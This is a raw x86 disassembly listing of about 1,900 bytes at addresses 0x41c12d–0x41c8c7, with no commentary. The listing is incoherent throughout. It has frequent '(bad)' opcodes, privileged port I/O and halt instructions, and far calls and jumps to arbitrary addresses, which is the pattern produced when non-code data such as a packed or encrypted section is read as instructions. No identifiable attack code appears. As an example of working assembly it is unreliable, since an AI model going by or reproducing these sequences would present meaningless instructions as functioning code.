  41c12d:	div    BYTE PTR [ebp+ebx*4+0x25]
  41c131:	in     eax,0xca
  41c133:	imul   edi,esi,0xffffffb0
  41c136:	sbb    eax,0x2d1ed09b
  41c13b:	xchg   ecx,eax
  41c13c:	nop
  41c13d:	mov    ?,WORD PTR [ebx-0x7b]
  41c140:	add    al,ch
  41c142:	push   edi
  41c143:	addr16 push ebx
  41c145:	mov    BYTE PTR [ebp+0x1ba8c79e],bh
  41c14b:	mov    ebx,edi
  41c14d:	(bad)  
  41c14e:	push   esi
  41c14f:	sbb    bl,cl
  41c151:	pop    ecx
  41c152:	mov    eax,ds:0x7172d9f6
  41c157:	(bad)  
  41c158:	call   0x5055:0xbb12b09b
  41c15f:	jle    0x41c169
  41c161:	popf   
  41c162:	mov    cl,0x0
  41c164:	(bad)  
  41c165:	jecxz  0x41c112
  41c167:	gs push ecx
  41c169:	les    ebx,FWORD PTR [ebp-0x6e]
  41c16c:	mov    cl,0x73
  41c16e:	fidivr DWORD PTR [ebx+0x43]
  41c171:	pop    esi
  41c172:	rol    BYTE PTR [edx-0x42db784a],cl
  41c178:	hlt    
  41c179:	ja     0x41c12d
  41c17b:	out    0x87,al
  41c17d:	mov    ah,0xb5
  41c17f:	push   edi
  41c180:	jmp    DWORD PTR [ebp-0x60]
  41c183:	cli    
  41c184:	xchg   esp,eax
  41c185:	mov    BYTE PTR [eax-0x46],dl
  41c188:	dec    ebx
  41c189:	fmul   st,st(0)
  41c18b:	das    
  41c18c:	and    ecx,esi
  41c18e:	loop   0x41c111
  41c190:	(bad)  
  41c191:	cmp    DWORD PTR [ecx+0x61],0xf86f5bde
  41c198:	stc    
  41c199:	pushf  
  41c19a:	mov    bl,0x71
  41c19c:	inc    eax
  41c19d:	sub    esi,ecx
  41c19f:	and    DWORD PTR [edx-0x6f],0xffffffae
  41c1a3:	cmp    BYTE PTR [edi+0x3e],ah
  41c1a6:	xchg   edi,eax
  41c1a7:	shr    BYTE PTR [esi+edx*2],0xfe
  41c1ab:	psubusw mm6,mm4
  41c1ae:	ins    BYTE PTR es:[edi],dx
  41c1af:	sbb    BYTE PTR [eax],dh
  41c1b1:	aam    0x5b
  41c1b3:	xchg   BYTE PTR [edi-0xd],ch
  41c1b6:	popf   
  41c1b7:	mov    edx,0xe1b237c8
  41c1bc:	cdq    
  41c1bd:	push   esi
  41c1be:	add    DWORD PTR [ecx-0x2dd000b9],ecx
  41c1c4:	addr16 cli 
  41c1c6:	fmulp  st(5),st
  41c1c8:	mov    edx,gs
  41c1ca:	inc    esp
  41c1cb:	scas   eax,DWORD PTR es:[edi]
  41c1cc:	mov    ecx,0xbaefc7e4
  41c1d1:	shr    DWORD PTR [esi-0x7e9b767e],cl
  41c1d7:	fdivrp st(4),st
  41c1d9:	out    dx,eax
  41c1da:	shl    bh,0x9d
  41c1dd:	(bad)  
  41c1de:	rcl    DWORD PTR [ecx],cl
  41c1e0:	(bad)  
  41c1e1:	cmpxchg DWORD PTR [edx+esi*8+0x23],ebp
  41c1e6:	mov    edx,0x43674eb9
  41c1eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1ec:	fs jo  0x41c1de
  41c1ef:	fidiv  WORD PTR [edi+0x4c]
  41c1f2:	jae    0x41c1d1
  41c1f4:	shr    BYTE PTR [eax-0x754450fe],cl
  41c1fa:	mov    al,ds:0x7bb0f053
  41c1ff:	xchg   ebp,edx
  41c201:	(bad)  
  41c202:	nop
  41c203:	dec    ebx
  41c204:	or     eax,0xcac61f2d
  41c209:	sbb    dh,BYTE PTR [ecx]
  41c20b:	call   0xb8f7dc46
  41c210:	arpl   si,sp
  41c212:	sbb    eax,0xaa24446e
  41c217:	sar    DWORD PTR ds:0xf3b0e1ab,cl
  41c21d:	mov    bl,0xd6
  41c21f:	dec    ebx
  41c220:	mov    DWORD PTR [ebp+0x5f535564],0xbe32e0a0
  41c22a:	sub    cl,BYTE PTR [edi-0x153daabe]
  41c230:	in     al,dx
  41c231:	les    ebx,FWORD PTR [eax+0x75]
  41c234:	pop    edx
  41c235:	mov    ecx,0xce0dddcc
  41c23a:	cdq    
  41c23b:	sbb    dl,BYTE PTR [ebx-0x6b]
  41c23e:	mov    ch,BYTE PTR [ebx-0x5d43bd35]
  41c244:	sub    DWORD PTR ds:0x63567e93,0x5ce02efb
  41c24e:	jmp    0x3fa2b0d3
  41c253:	(bad)  
  41c254:	je     0x41c1d8
  41c256:	inc    BYTE PTR [ebp-0x67276f7b]
  41c25c:	jg     0x41c23c
  41c25e:	fwait
  41c25f:	and    eax,0x5c1049df
  41c264:	push   ss
  41c265:	fdiv   QWORD PTR [edi]
  41c267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c268:	rcr    ebx,0x9f
  41c26b:	jecxz  0x41c25e
  41c26d:	adc    esp,ecx
  41c26f:	mov    ch,0x2d
  41c271:	add    DWORD PTR [esi+0x2d],ecx
  41c274:	ja     0x41c220
  41c276:	or     al,0x89
  41c278:	pop    ds
  41c279:	xor    ch,BYTE PTR [esi+edi*4-0x3d]
  41c27d:	mov    esi,0x1c92e7c5
  41c282:	inc    ebx
  41c283:	(bad)  
  41c284:	or     BYTE PTR [eax+0x112798f],ah
  41c28a:	out    0x9f,eax
  41c28c:	(bad)
  41c290:	in     eax,dx
  41c291:	sub    DWORD PTR [edx-0x51],edi
  41c294:	push   edx
  41c295:	push   esp
  41c296:	push   esi
  41c297:	ss popw ds
  41c29a:	or     al,0x21
  41c29c:	ja     0x41c300
  41c29e:	xor    eax,0x7e8dd0a4
  41c2a3:	jmp    DWORD PTR [ecx]
  41c2a5:	pop    eax
  41c2a6:	stos   DWORD PTR es:[edi],eax
  41c2a7:	mov    esp,ebp
  41c2a9:	mov    cl,0x26
  41c2ab:	push   0xffffff9f
  41c2ad:	add    al,0x7b
  41c2af:	test   BYTE PTR [eax+edi*4+0x3bc0521a],bh
  41c2b6:	jle    0x41c30f
  41c2b8:	test   DWORD PTR [ecx+0x304e0264],edx
  41c2be:	or     al,0x98
  41c2c0:	scas   eax,DWORD PTR es:[edi]
  41c2c1:	adc    ah,ah
  41c2c3:	fidivr DWORD PTR [edi]
  41c2c5:	jmp    0x9b95e365
  41c2ca:	xchg   ebx,eax
  41c2cb:	jle    0x41c27c
  41c2cd:	retf   0x36a8
  41c2d0:	add    BYTE PTR [edx],bl
  41c2d2:	js     0x41c2d0
  41c2d4:	push   edx
  41c2d5:	cs shr esp,1
  41c2d8:	dec    eax
  41c2d9:	lock pop esp
  41c2db:	or     eax,0xb0e1fe01
  41c2e0:	push   esp
  41c2e1:	cmp    dh,ah
  41c2e3:	or     ecx,esi
  41c2e5:	pop    edx
  41c2e6:	call   0x8296:0x822cd6b5
  41c2ed:	fadd   QWORD PTR [ebx+ecx*8+0x63d2dd64]
  41c2f4:	mov    ds:0x24cd8f58,al
  41c2f9:	retf   0x148d
  41c2fc:	jno    0x41c2ae
  41c2fe:	mov    eax,ds:0x37b5ee2d
  41c303:	and    eax,0xd9817dde
  41c308:	mov    ebp,0x918378fc
  41c30d:	dec    ebp
  41c30e:	sbb    al,al
  41c310:	xchg   edi,eax
  41c311:	fisubr DWORD PTR [edx+0x4ef7e865]
  41c317:	cmp    ah,BYTE PTR [ebx]
  41c319:	iret   
  41c31a:	sub    edi,DWORD PTR [esi+0x5a12954b]
  41c320:	leave  
  41c321:	icebp  
  41c322:	ss mov ah,0x84
  41c325:	push   edi
  41c326:	in     eax,0x4c
  41c328:	adc    edi,DWORD PTR [ecx+0x351c03da]
  41c32e:	(bad)  
  41c32f:	pushf  
  41c330:	ret    
  41c331:	addr16 push edx
  41c333:	mov    BYTE PTR cs:[esi],cl
  41c336:	mov    ecx,0xd576ad71
  41c33b:	shl    DWORD PTR [ecx],0xfe
  41c33e:	dec    eax
  41c33f:	ficomp WORD PTR [esi+ebx*8+0x44]
  41c343:	in     eax,dx
  41c344:	mov    al,es:0xbdc8e4b8
  41c34a:	shl    DWORD PTR [ebx+0x4ba39dbf],0x3d
  41c351:	(bad)  
  41c352:	std    
  41c353:	push   esp
  41c354:	mov    ebx,0xc42e3346
  41c359:	dec    bh
  41c35b:	ret    
  41c35c:	mov    db7,eax
  41c35f:	inc    eax
  41c360:	jmp    0x27601891
  41c365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c366:	mov    ebp,0xa0f1b629
  41c36b:	mov    bl,0x61
  41c36d:	add    eax,0xb67bf70a
  41c372:	pop    ss
  41c373:	outs   dx,BYTE PTR ds:[esi]
  41c374:	fsubr  DWORD PTR [ecx]
  41c376:	inc    ebp
  41c377:	push   esp
  41c378:	cmp    ah,BYTE PTR [edi-0x37]
  41c37b:	mov    dh,0xcc
  41c37d:	dec    esi
  41c37e:	mov    dl,0xdb
  41c380:	int    0xf3
  41c382:	outs   dx,BYTE PTR ds:[esi]
  41c383:	pop    ebx
  41c384:	sub    esi,edx
  41c386:	cmc    
  41c387:	out    0x4e,eax
  41c389:	ds mov esi,0x3ee73a17
  41c38f:	ret    
  41c390:	xchg   ebp,eax
  41c391:	xor    BYTE PTR [eax+0x6c],bh
  41c394:	loope  0x41c339
  41c396:	fwait
  41c397:	cs jmp 0x9eed6943
  41c39d:	push   ebp
  41c39e:	daa    
  41c39f:	pop    ebp
  41c3a0:	mov    ebx,0xad2fe5e3
  41c3a5:	lods   eax,DWORD PTR ds:[esi]
  41c3a6:	cmp    ebx,DWORD PTR [edx*2-0x6e749ad7]
  41c3ad:	mov    ds:0x5b5fdded,eax
  41c3b2:	lods   al,BYTE PTR ds:[esi]
  41c3b3:	adc    DWORD PTR [ebx-0x44],0x14949c5f
  41c3ba:	loopne 0x41c383
  41c3bc:	xchg   ebx,eax
  41c3bd:	push   esp
  41c3be:	cmp    al,0x30
  41c3c0:	cli    
  41c3c1:	xchg   esi,eax
  41c3c2:	push   cs
  41c3c3:	xchg   cl,dl
  41c3c5:	dec    esi
  41c3c6:	jle    0x41c385
  41c3c8:	jge    0x41c402
  41c3ca:	cmp    al,0x3d
  41c3cc:	jb     0x41c37e
  41c3ce:	mov    al,ds:0x384d235a
  41c3d3:	push   ebx
  41c3d4:	stc    
  41c3d5:	pop    ss
  41c3d6:	xchg   edi,ebx
  41c3d8:	sub    al,0x72
  41c3da:	push   ss
  41c3db:	sub    BYTE PTR [ebx+0x1c9e2d81],bh
  41c3e1:	into   
  41c3e2:	sub    DWORD PTR [ecx+0x7f701aba],esi
  41c3e8:	add    ah,BYTE PTR [edx]
  41c3ea:	jns    0x41c396
  41c3ec:	imul   edi,ecx,0xffffffe3
  41c3ef:	loope  0x41c43b
  41c3f1:	aas    
  41c3f2:	dec    eax
  41c3f3:	inc    edi
  41c3f4:	call   0xfcfc6f22
  41c3f9:	dec    ebx
  41c3fa:	jle    0x41c463
  41c3fc:	pop    ebp
  41c3fd:	or     eax,0xeba22ff6
  41c402:	xor    esi,esi
  41c404:	add    BYTE PTR [edi-0x19],al
  41c407:	fs scas al,BYTE PTR es:[edi]
  41c409:	sbb    BYTE PTR [ebx-0x30],cl
  41c40c:	(bad)  
  41c40e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c40f:	stc    
  41c410:	jl     0x41c3e2
  41c412:	mov    bh,0x3c
  41c414:	stc    
  41c415:	mov    ebp,0x8f94fd28
  41c41a:	test   ah,bh
  41c41c:	xor    DWORD PTR [esi+0x2a],ebx
  41c41f:	lds    ecx,FWORD PTR [edi+0x49]
  41c422:	fild   DWORD PTR [ecx+0x42185c11]
  41c428:	cli    
  41c429:	pop    ss
  41c42a:	xchg   DWORD PTR [edx+0x2e],ebx
  41c42d:	sbb    eax,0x2fe33169
  41c432:	xor    ebx,edi
  41c434:	das    
  41c435:	bound  ebx,QWORD PTR [ebp-0x7f]
  41c438:	mov    ds:0xe2bf68e4,eax
  41c43d:	fiadd  WORD PTR [edx]
  41c43f:	xchg   ebp,eax
  41c440:	ret    0x3b8c
  41c443:	retf   0x1bba
  41c446:	sar    DWORD PTR ds:0x8ebfb86,cl
  41c44c:	pop    ebp
  41c44d:	sbb    DWORD PTR [ebp+0x6c0a820d],0x729537bf
  41c457:	ins    BYTE PTR es:[edi],dx
  41c458:	jbe    0x41c3fd
  41c45a:	fnstenv [esi+0x1635246]
  41c460:	paddsw mm6,QWORD PTR [esi]
  41c463:	inc    edx
  41c464:	sbb    eax,0x5407ea84
  41c469:	jl     0x41c435
  41c46b:	jnp    0x41c471
  41c46d:	aam    0xaf
  41c46f:	(bad)  
  41c470:	xchg   edi,eax
  41c471:	ror    BYTE PTR [ebp+0x48],cl
  41c474:	add    eax,DWORD PTR [eax+0x63034065]
  41c47a:	sub    dl,BYTE PTR [ebx+0x30f2a44d]
  41c480:	call   0xa713ada4
  41c485:	cmp    esp,edi
  41c487:	xchg   BYTE PTR [edx+0x69b72c8a],al
  41c48d:	popa   
  41c48e:	lods   eax,DWORD PTR ds:[esi]
  41c48f:	adc    DWORD PTR [ecx-0x33],edi
  41c492:	test   eax,0x9833fb4e
  41c497:	shr    DWORD PTR [ecx-0x10],cl
  41c49a:	or     cl,BYTE PTR [edi-0x2bedb241]
  41c4a0:	das    
  41c4a1:	push   0x48e83e8e
  41c4a6:	mov    al,0x78
  41c4a8:	retf   0xc619
  41c4ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4ac:	popf   
  41c4ad:	xor    esp,DWORD PTR [eax-0x6c7899e9]
  41c4b3:	push   esi
  41c4b4:	mov    edx,0x966909c3
  41c4b9:	hlt    
  41c4ba:	dec    edi
  41c4bb:	outs   dx,DWORD PTR ds:[esi]
  41c4bc:	cld    
  41c4bd:	xor    DWORD PTR [esp+ebp*4+0x22],ecx
  41c4c1:	(bad)  
  41c4c2:	pop    esi
  41c4c3:	nop
  41c4c4:	add    edx,DWORD PTR [edi-0x70154367]
  41c4ca:	or     BYTE PTR gs:[eax],dl
  41c4cd:	xchg   DWORD PTR [edx],ecx
  41c4cf:	sub    DWORD PTR [edx-0x59f2cc04],esi
  41c4d5:	stos   DWORD PTR es:[edi],eax
  41c4d6:	mov    eax,0x292d1db7
  41c4db:	out    0xd4,al
  41c4dd:	add    DWORD PTR [edx-0x7a126cb2],edi
  41c4e3:	push   ebx
  41c4e4:	pop    eax
  41c4e5:	adc    DWORD PTR [esi],0x7f4d015a
  41c4eb:	cmp    eax,esi
  41c4ed:	outs   dx,BYTE PTR ds:[esi]
  41c4ee:	pop    esi
  41c4ef:	popf   
  41c4f0:	mov    ecx,0xddf0d98f
  41c4f5:	push   0xffffffc1
  41c4f7:	sub    DWORD PTR [ebx-0x744090c8],edx
  41c4fd:	mov    edx,0x57767b42
  41c502:	mov    esi,0xd422ce31
  41c507:	pushf  
  41c508:	repnz aaa 
  41c50a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c50b:	sub    DWORD PTR [eax],0xb0ac85b7
  41c511:	add    bh,dl
  41c513:	or     eax,0xdad446e4
  41c518:	sbb    eax,0x6b716ca6
  41c51d:	pop    es
  41c51e:	push   ebp
  41c51f:	enter  0x5c8d,0x36
  41c523:	dec    edi
  41c524:	lds    esi,FWORD PTR [esp+eiz*2+0x4b5cfec1]
  41c52b:	xchg   esp,eax
  41c52c:	jb     0x41c4cd
  41c52e:	loop   0x41c5ae
  41c530:	pop    esp
  41c531:	adc    dl,cl
  41c533:	or     DWORD PTR [esi],ebp
  41c535:	xor    al,0x9c
  41c537:	out    0x9a,eax
  41c539:	xchg   esp,eax
  41c53a:	test   edx,eax
  41c53c:	jmp    FWORD PTR [esi-0x4f]
  41c53f:	cdq    
  41c540:	popf   
  41c541:	dec    ebx
  41c542:	loope  0x41c525
  41c544:	inc    edi
  41c545:	sbb    al,0x39
  41c547:	loope  0x41c4f5
  41c549:	or     DWORD PTR [esi+0x63],esi
  41c54c:	pop    edx
  41c54d:	or     DWORD PTR [esi+0x4e778150],0x4
  41c554:	(bad)  
  41c556:	cmp    esi,esp
  41c558:	push   esp
  41c559:	or     eax,0x8e25d3b8
  41c55e:	iret   
  41c55f:	xchg   DWORD PTR [edx-0x1],esi
  41c562:	pop    ebx
  41c563:	sub    BYTE PTR ds:0xa0102b8a,0x5
  41c56a:	jecxz  0x41c592
  41c56c:	jle    0x41c5c4
  41c56e:	pop    edi
  41c56f:	cli    
  41c570:	jp     0x41c4fb
  41c572:	and    eax,0x87e6d449
  41c577:	pop    DWORD PTR [esi-0x5abff88b]
  41c57d:	xchg   BYTE PTR [ebp+0x6d730015],dh
  41c583:	std    
  41c584:	dec    esi
  41c585:	fldenv [ebx-0x3f]
  41c588:	in     eax,0xda
  41c58a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c58b:	pushf  
  41c58c:	icebp  
  41c58d:	(bad)  
  41c58e:	jg     0x41c52f
  41c590:	jae    0x41c574
  41c592:	in     al,0x38
  41c594:	push   ds
  41c595:	push   cs
  41c596:	or     eax,0x9d6a6751
  41c59b:	mov    esp,0x5366978f
  41c5a0:	inc    esi
  41c5a1:	mov    dl,0x93
  41c5a3:	in     al,dx
  41c5a4:	leave  
  41c5a5:	ins    DWORD PTR es:[edi],dx
  41c5a6:	rcl    bl,0x1d
  41c5a9:	stc    
  41c5aa:	or     DWORD PTR [edi+0x13993bcc],0xaba45984
  41c5b4:	push   0xffffffb6
  41c5b6:	add    al,0xc5
  41c5b8:	retf   0x3c57
  41c5bb:	in     al,0xf3
  41c5bd:	mov    ecx,0x6974a645
  41c5c2:	in     eax,dx
  41c5c3:	xor    BYTE PTR [edi],bl
  41c5c5:	dec    ebx
  41c5c6:	cli    
  41c5c7:	mov    al,ds:0x73e2f5ea
  41c5cc:	fs pop esp
  41c5ce:	adc    dl,bl
  41c5d0:	mov    WORD PTR [ebp-0x7a5d60ba],fs
  41c5d6:	pop    edi
  41c5d7:	inc    DWORD PTR [eax-0x5b]
  41c5da:	jnp    0x41c5b5
  41c5dc:	imul   BYTE PTR [edx+0x18c6b175]
  41c5e2:	push   0xf9901dcc
  41c5e7:	mov    ebx,ss
  41c5e9:	les    esp,FWORD PTR [edx-0x4e]
  41c5ec:	jmp    0x41c661
  41c5ee:	inc    ebp
  41c5ef:	xor    ch,BYTE PTR [eax-0x7e23c3fa]
  41c5f5:	sub    edx,DWORD PTR [esi]
  41c5f7:	pop    edx
  41c5f8:	outs   dx,DWORD PTR ds:[esi]
  41c5f9:	sub    BYTE PTR [esi-0x4e0fc3af],ah
  41c5ff:	sbb    al,BYTE PTR [ebp-0x7b7f9e85]
  41c605:	ins    BYTE PTR es:[edi],dx
  41c606:	add    al,0xcd
  41c608:	in     al,dx
  41c609:	or     cl,BYTE PTR [esi+0x3fc59d39]
  41c60f:	inc    eax
  41c610:	fcomp  QWORD PTR [edx+0x6e989c16]
  41c616:	xor    al,0x86
  41c618:	inc    edx
  41c619:	add    ebp,esp
  41c61b:	push   ds
  41c61c:	and    al,0xa3
  41c61e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c61f:	mov    al,0x3b
  41c621:	mov    esi,0xdde8422c
  41c626:	cld    
  41c627:	call   0x261c6d8f
  41c62c:	and    esp,DWORD PTR [eax-0xe]
  41c62f:	data16 aad 0x1f
  41c632:	and    DWORD PTR [ebp+0x1ad75378],ebp
  41c638:	jbe    0x41c68a
  41c63a:	in     al,dx
  41c63b:	jae    0x41c67c
  41c63d:	ins    DWORD PTR es:[edi],dx
  41c63e:	push   cs
  41c63f:	pop    edi
  41c640:	in     al,dx
  41c641:	aam    0x5b
  41c643:	cli    
  41c644:	or     al,BYTE PTR [edi]
  41c646:	xchg   BYTE PTR [edx-0x3347ca43],bh
  41c64c:	sbb    BYTE PTR [ebp-0x79c1d447],ah
  41c652:	push   cs
  41c653:	les    edi,FWORD PTR cs:[ecx]
  41c656:	dec    esi
  41c657:	dec    esi
  41c658:	lea    esi,[ebp-0x1045e353]
  41c65e:	adc    eax,0xb4fd888c
  41c663:	pushf  
  41c664:	or     al,0x12
  41c666:	scas   eax,DWORD PTR es:[edi]
  41c667:	iret   
  41c668:	mov    ebx,0x7a07d197
  41c66d:	dec    esp
  41c66e:	xor    DWORD PTR [esi+ebp*8+0x62],esi
  41c672:	sub    edx,DWORD PTR [ecx-0x52]
  41c675:	sub    ebp,DWORD PTR ds:0xfb245e9a
  41c67b:	sbb    cl,BYTE PTR [ebx+0x29]
  41c67e:	mov    ah,0xf
  41c680:	repnz sahf 
  41c682:	aam    0xa8
  41c684:	sbb    BYTE PTR [eax],0x77
  41c687:	xor    dl,BYTE PTR [esi-0x76]
  41c68a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c68b:	and    BYTE PTR [ecx+0x4d820429],bl
  41c691:	push   ds
  41c692:	mov    ds:0xb3477f96,eax
  41c697:	adc    BYTE PTR [ecx+edi*2+0x6b774b00],bl
  41c69e:	dec    esp
  41c69f:	inc    ebx
  41c6a0:	sub    al,0x8c
  41c6a2:	dec    edi
  41c6a3:	sahf   
  41c6a4:	aaa    
  41c6a5:	jecxz  0x41c707
  41c6a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6a8:	sbb    edi,ecx
  41c6aa:	cmp    dh,BYTE PTR [edx-0x5d9f733f]
  41c6b0:	jae    0x41c66b
  41c6b2:	inc    eax
  41c6b3:	adc    al,0xf8
  41c6b5:	sub    DWORD PTR [esi+0x4b0c4299],0x447a24a
  41c6bf:	xchg   edx,eax
  41c6c0:	in     eax,dx
  41c6c1:	dec    eax
  41c6c2:	inc    ebx
  41c6c3:	lods   eax,DWORD PTR ds:[esi]
  41c6c4:	pop    ebp
  41c6c5:	nop
  41c6c6:	jo     0x41c6ad
  41c6c8:	test   DWORD PTR [eax+0x38],ebp
  41c6cb:	mov    edx,0xe7079b84
  41c6d0:	daa    
  41c6d1:	sub    edx,ebx
  41c6d3:	xor    eax,0xc9c77624
  41c6d8:	mov    bl,0xff
  41c6da:	xchg   ebx,eax
  41c6db:	push   esp
  41c6dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6dd:	push   ss
  41c6de:	push   es
  41c6df:	dec    esi
  41c6e0:	or     ebx,DWORD PTR [edx+0x1bfed1f8]
  41c6e6:	mov    ecx,0x31894ed2
  41c6eb:	ja     0x41c6d1
  41c6ed:	imul   DWORD PTR [esi+0x725ba8e9]
  41c6f3:	clc    
  41c6f4:	stos   BYTE PTR es:[edi],al
  41c6f5:	push   eax
  41c6f6:	scas   al,BYTE PTR es:[edi]
  41c6f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f8:	push   ebp
  41c6fa:	dec    eax
  41c6fb:	mov    eax,0xed98b71a
  41c700:	xchg   esp,eax
  41c701:	or     BYTE PTR [ebp-0x30],0x57
  41c705:	and    al,0xf5
  41c707:	mov    edx,fs
  41c709:	mov    cl,0xa4
  41c70b:	(bad)  
  41c70c:	call   0xb7a5:0x102af158
  41c713:	into   
  41c714:	xor    al,0x7
  41c716:	pusha  
  41c717:	dec    ecx
  41c718:	and    cl,BYTE PTR [ebx-0x2b]
  41c71b:	push   0x42
  41c71d:	into   
  41c71e:	dec    edx
  41c71f:	(bad)  
  41c720:	adc    DWORD PTR [edi],0xc4f87ca8
  41c726:	pop    esp
  41c727:	div    BYTE PTR [ecx-0x45]
  41c72a:	push   esi
  41c72b:	jbe    0x41c75a
  41c72d:	push   0xfffffffe
  41c72f:	push   ecx
  41c730:	sbb    eax,0x2d8752a2
  41c735:	xor    edx,DWORD PTR [ecx]
  41c737:	push   0xffffff82
  41c739:	inc    ebp
  41c73a:	mov    esp,0x924c2a33
  41c73f:	in     al,0x79
  41c741:	push   0xfffffffb
  41c743:	scas   eax,DWORD PTR es:[edi]
  41c744:	push   eax
  41c745:	aad    0xce
  41c747:	mov    eax,0x9b197727
  41c74c:	icebp  
  41c74d:	dec    esi
  41c74e:	sub    ch,bh
  41c750:	fistp  DWORD PTR [edi-0x6f]
  41c753:	sti    
  41c754:	jl     0x41c6ee
  41c756:	pop    es
  41c757:	push   esi
  41c758:	jne    0x41c7a9
  41c75a:	dec    esp
  41c75b:	scas   al,BYTE PTR es:[edi]
  41c75c:	shl    DWORD PTR [ebx],cl
  41c75e:	mov    bh,0x6b
  41c760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c761:	xchg   ecx,eax
  41c762:	retf   
  41c763:	jb     0x41c708
  41c765:	push   edi
  41c766:	retf   0xf726
  41c769:	sub    DWORD PTR [edi+0x10d83f9f],ebp
  41c76f:	cs mov esp,0x2801e768
  41c775:	pop    edi
  41c776:	hlt    
  41c777:	sahf   
  41c778:	pusha  
  41c779:	inc    ecx
  41c77a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c77b:	scas   eax,DWORD PTR es:[edi]
  41c77c:	xlat   BYTE PTR ds:[ebx]
  41c77d:	mov    cl,0x23
  41c77f:	sbb    DWORD PTR [esi-0x44],ecx
  41c782:	xor    al,0x74
  41c784:	push   0x5e
  41c786:	mov    eax,ds:0x6a35756
  41c78b:	call   0xa37e:0x2f774a2d
  41c792:	int    0x5e
  41c794:	mov    ch,BYTE PTR ds:0x7123c1aa
  41c79a:	xor    BYTE PTR [ecx-0x60],dl
  41c79d:	inc    ecx
  41c79e:	test   al,0x68
  41c7a0:	push   ss
  41c7a1:	mov    al,ds:0xc91b518b
  41c7a6:	xor    esp,DWORD PTR ds:0x1e516222
  41c7ac:	fild   DWORD PTR [edx+0x6b]
  41c7af:	lods   eax,DWORD PTR ds:[esi]
  41c7b0:	push   cs
  41c7b1:	inc    edx
  41c7b2:	mov    esi,0xde7b08cf
  41c7b7:	loop   0x41c814
  41c7b9:	(bad)  
  41c7ba:	imul   esi,DWORD PTR [ebx-0x74],0xffffffe2
  41c7be:	xor    ebx,DWORD PTR [edx+0x3cd45af6]
  41c7c4:	cmp    al,0x10
  41c7c6:	ds scas al,BYTE PTR es:[edi]
  41c7c8:	cmp    BYTE PTR [edi],bh
  41c7ca:	daa    
  41c7cb:	shl    DWORD PTR [ecx+0x19431cf3],1
  41c7d1:	add    DWORD PTR [ebp-0x1e],esp
  41c7d4:	stos   BYTE PTR es:[edi],al
  41c7d5:	dec    esi
  41c7d6:	mov    DWORD PTR [esi-0x24fa68f3],esp
  41c7dc:	into   
  41c7dd:	cmp    DWORD PTR [ebx-0x73],ebx
  41c7e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7e1:	xor    cl,BYTE PTR gs:[esi*4+0x1ce24a1a]
  41c7e9:	cmp    bh,BYTE PTR [ecx]
  41c7eb:	push   es
  41c7ec:	int3   
  41c7ed:	mov    eax,ds:0x2aecc695
  41c7f2:	mov    DWORD PTR [esi+0x1f],0x5cd37f89
  41c7f9:	scas   eax,DWORD PTR es:[edi]
  41c7fa:	xchg   DWORD PTR [ecx-0x3],esp
  41c7fd:	mov    ecx,0x36b48132
  41c802:	or     esi,edi
  41c804:	pop    esp
  41c805:	je     0x41c84c
  41c807:	mov    edx,0xdd184478
  41c80c:	ret    0x7a72
  41c80f:	in     al,0x71
  41c811:	enter  0x5af3,0x88
  41c815:	fisub  DWORD PTR [esi+edx*1-0x66]
  41c819:	test   eax,0xb243ecb
  41c81e:	pushf  
  41c81f:	sahf   
  41c820:	adc    al,0xdd
  41c822:	jo     0x41c84e
  41c824:	ret    0x35c9
  41c827:	xchg   edx,eax
  41c828:	dec    ebx
  41c829:	imul   ecx,DWORD PTR [ebp+0x21],0xe6ea08d
  41c830:	cmp    BYTE PTR [edi],ch
  41c832:	icebp  
  41c833:	fs dec ebx
  41c835:	lds    edi,FWORD PTR [edx+0x26]
  41c838:	cli    
  41c839:	sbb    edi,DWORD PTR ds:0xfbe01407
  41c83f:	mov    dh,0x95
  41c841:	pop    ds
  41c842:	push   esp
  41c843:	xor    bl,BYTE PTR [ecx]
  41c845:	stos   DWORD PTR es:[edi],eax
  41c846:	dec    ecx
  41c847:	sbb    ecx,DWORD PTR [esi+ebp*4+0x5e5dc94a]
  41c84e:	or     esi,eax
  41c850:	inc    eax
  41c851:	es in  al,0x54
  41c854:	cmp    BYTE PTR [ebx],dl
  41c856:	dec    edx
  41c857:	adc    BYTE PTR [ebx],0xde
  41c85a:	mov    BYTE PTR [esp+ebx*2+0x5cf1ba46],ah
  41c861:	and    eax,0x8caf13d7
  41c866:	sti    
  41c867:	sahf   
  41c868:	repz sub al,BYTE PTR ds:0x1ba0d408
  41c86f:	adc    al,0xc3
  41c871:	cld    
  41c872:	popa   
  41c873:	out    0x4,eax
  41c875:	sbb    al,0x33
  41c877:	aaa    
  41c878:	mov    bh,0xaf
  41c87a:	rcr    DWORD PTR [ecx+0x13],0xe7
  41c87e:	int3   
  41c87f:	clc    
  41c880:	mov    eax,ds:0x2e308787
  41c885:	cmp    eax,0xc77778d8
  41c88a:	adc    DWORD PTR [edx-0x24170316],0xa8e85055
  41c894:	dec    edi
  41c895:	and    cl,cl
  41c897:	sbb    eax,0xe2961073
  41c89c:	fwait
  41c89d:	mov    ecx,0xa81ac6b9
  41c8a2:	and    bh,0xb
  41c8a5:	mov    eax,0x5b2061ad
  41c8aa:	cld    
  41c8ab:	bound  eax,QWORD PTR [ebp+0x25f5e95a]
  41c8b1:	pop    esi
  41c8b2:	pop    ss
  41c8b3:	test   al,0x53
  41c8b5:	retf   0xb9a9
  41c8b8:	arpl   WORD PTR [ecx-0x4786dfbb],bp
  41c8be:	scas   eax,DWORD PTR es:[edi]
  41c8bf:	pop    ebp
  41c8c0:	in     al,dx
  41c8c1:	dec    edx
  41c8c2:	jl     0x41c851
  41c8c4:	cmp    dl,BYTE PTR [ebx-0x31]
  41c8c7:	fst    st(2)
